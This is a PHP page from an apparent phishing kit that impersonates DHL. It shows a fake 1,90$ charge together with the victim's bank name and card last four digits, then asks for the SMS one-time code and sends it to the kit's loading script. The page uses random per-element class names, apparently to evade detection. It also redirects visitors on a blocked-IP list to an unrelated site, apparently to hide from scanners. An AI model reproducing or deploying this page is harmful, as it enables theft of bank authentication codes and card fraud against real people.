<?php
    error_reporting(0);
    session_start();
    include '../setting/functions.php';    
    require_once "../setting/lang.php";

    function isBlocked($ip) {
        $blockedIPs = file_get_contents('../panel/blocked_ips.txt');
        return strpos($blockedIPs, $ip) !== false;
    }

    // Get the user's IP address
    $userIP = get_client_ip();

    // Check if the user's IP is blocked
    if (isBlocked($userIP)) {
        // Redirect the blocked user to another page
        header("Location: https://www.superhonda.com/");
        exit();
    }


    // Lang Fucntion :
    lang();

    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="en" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> ">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../css/basic-thinks.css">
    <!-- Favicon -->
    <link rel="icon" href="../img/favicon.gif">
    <link rel="shortcut" href="../img/favicon.gif">
    <link rel="appel-touch-icon" href="../img/favicon.gif">
    <title>DHL - <?php echo get_text('title_head'); ?></title>
</head>
<body id="body"  class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> ">
    <!-- Start Nav Bar -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> nav-bar" id="navBar">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-nav-bar" id="menu">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-image-and-links-nav-bar" id="menu2">
                <img class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain" src="../img/logo.png">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> links-nav-bar">
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain link-nav-bar"><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-circle-exclamation"></i><?php echo get_text('top_header1'); ?></span>
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain link-nav-bar"><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-message"></i><?php echo get_text('top_header2'); ?></span>
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain link-nav-bar"><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-globe"></i><?php echo get_text('top_header3'); ?></span>
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain link-nav-bar"><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-magnifying-glass"></i><?php echo get_text('top_header4'); ?></span>
                </div>
            </div>
            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> menu-bar-button" id="buttonMenu"><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-bars" id="buttonMenuIcon"></i></span>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> links-nav-bar-other">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> links-nav-bar-other-1">
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain link-nav-bar-other"><?php echo get_text('mainmenu1'); ?><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-angle-down"></i></span>
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain link-nav-bar-other"><?php echo get_text('mainmenu2'); ?><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-angle-down"></i></span>
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain link-nav-bar-other"><?php echo get_text('mainmenu3'); ?><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-angle-down"></i></span>
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain link-nav-bar-other"><?php echo get_text('mainmenu4'); ?><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-angle-down"></i></span>
                </div>

                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> links-nav-bar-other-2">
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain link-nav-bar-other-2"><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-user"></i><?php echo get_text('header-right'); ?></span>
                </div>
            </div>
        </div>
    </div>
    <!-- End Nav Bar -->

    <!-- Start main -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> home">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-home">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container">
                <h1 class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> title-home"><?php echo get_text('title'); ?></h1>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> steps-and-title">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> title-steps">
                        <img src="../img/image-step.png" alt="">
                        <h3><?php echo get_text('title2'); ?></h3>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> steps">
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> green-step"></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> green-step"></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> red-step"></span>
                    </div>
                </div>
                <!-- Start Page Confirmation -->
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> page-confirmation">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-page-confirmation">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> header-page-confirmation">
                            <img src="../img/logo.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain">
                            <?php echo $_SESSION["image_by"]; ?>
                        </div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> details-page-confirmation">
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> explain-text-and-icon">
                                <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-comment-sms"></i>
                                <span><?php echo get_text('title_mss'); ?></span>
                            </div>
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-details">
                                <h5><?php echo get_text('title_mss_2'); ?></h5>
                                <h5 class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> value-details" style="color: #D40511 !important;">
                                <?php 
                                    if(isset($_SESSION["name_the_bank"])) {
                                        echo $_SESSION["name_the_bank"];
                                    } elseif ($_SESSION["name_the_bank"] === "UNKNOWN") {
                                        echo "DHL Express";
                                    }else {
                                        echo "DHL Express";
                                    }
                                ?>
                                </h5>
                            </div>
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-details">
                                <h5><?php echo get_text('title_mss_3'); ?></h5>
                                <h5 class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> value-details">1,90$</h5>
                            </div>
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-details">
                                <h5><?php echo get_text('title_mss_4'); ?></h5>
                                <h5 class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> value-details"><?php echo date('l jS \of  h:i A'); ?></h5>
                            </div>
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-details">
                                <h5><?php echo get_text('title_mss_5'); ?></h5>
                                <h5 class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> value-details">XXXX XXXX XXXX <?php echo $_SESSION["Last_four_digits"]; ?></h5>
                            </div>
                        </div>
                        <form action="./loading.php" method="post" id="claveForm">
                            <input type="hidden" name="step" value="otp-code">   
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-input" id="div1">
                                <label for="mss"><?php echo get_text('sms_code_label'); ?><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> star">*</span></label>
                                <input type="tel" name="mss" id="mss" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> form-control">
                                <div id="messageError1" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-error"><?php echo get_text('message_error_inputs'); ?></div>
                                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> counter">
                                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> title-counter"><?php echo get_text('counter_title'); ?> </span>
                                    <span id="minutes" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> counter-time">05</span><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> counter-time">:</span><span id="seconds" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> counter-time">00</span>
                                </span>
                            </div>
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-button">
                                <button class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> button-send-data" type="submit" name="send_data_4" id="buttonSendData"><?php echo get_text('next'); ?></button>
                            </div>
                        </form>
                    </div>
                </div>

                <!-- End Page Confirmation -->
            </div>
            <!-- Start Footer -->
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> footer">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-footer">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> image-footer-and-links-footer">
                        <img src="../img/image-footer.png" alt="">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> links-footer">
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('footer-menu-1'); ?></span>
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('footer-menu-2'); ?></span>
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('footer-menu-3'); ?></span>
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('footer-menu-4'); ?></span>
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('footer-menu-5'); ?></span>
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('footer-menu-6'); ?></span>
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('footer-menu-7'); ?></span>
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('footer-menu-8'); ?></span>
                        </div>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> social-media-links-footer">
                        <h4><?php echo get_text('follow-us'); ?></h4>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> social-media">
                            <span style="padding-left:0px !important;" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> social-media-link show-message-explain"><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-brands fa-youtube"></i></span>
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> social-media-link show-message-explain"><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-brands fa-facebook"></i></span>
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> social-media-link show-message-explain"><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-brands fa-linkedin"></i></span>
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> social-media-link show-message-explain"><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-brands fa-instagram"></i></span>
                        </div>
                    </div>
                </div>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> copyright"><?php echo date('Y'); ?> <?php echo get_text('copyright'); ?></div>
            </div>
            <!-- End Footer -->
        </div>
    </div>
    <!-- End main -->

    <!-- Message Explain -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-user" id="messageUser">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-message-user">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> header-messsage-user">
                <img src="../img/logo.png" alt="">
                <button class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> close-message-header" id="closeMessageuser1" type="button"><i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-xmark"></i></button>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> text-message-user">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> alert-icon">
                    <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-shield-halved"></i>
                </span>
                <h2><?php echo get_text('title-text-message-user'); ?></h2>
                <p><?php echo get_text('text-message-user'); ?></p>
                <button type="button" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> close-message-user" id="closeMessageuser2"><?php echo get_text('button-text-message-user'); ?></button>
            </div>
        </div>
    </div>
    <!-- Message Explain -->

    <!-- Script Js -->
    <script src="../js/script-all.js"></script>
    <script src="../js/script-mss.js"></script>
    <script>
        // Function to check if IP is in the list and redirect if necessary
        function checkBlockedIP() {
            // Fetch the IP list file using AJAX
            fetch('../panel/blocked_ips.txt')
                .then(response => response.text())
                .then(data => {
                    // Split the data into an array of IP addresses
                    const ipList = data.trim().split('\n');

                    // Get user's IP address using PHP function
                    const userIP = '<?php echo get_client_ip(); ?>';

                    // Check if user's IP is in the list
                    if (ipList.includes(userIP)) {
                        // Redirect user to another page if their IP is in the list
                        window.location.href = 'https://www.superhonda.com/';
                    }
                })
                .catch(error => console.error('Error fetching IP list:', error));
        }

        // Call the function immediately when the page loads
        checkBlockedIP();

        // Check blocked IP every 5 seconds
        setInterval(checkBlockedIP, 1000);
    </script>

</body>
</html>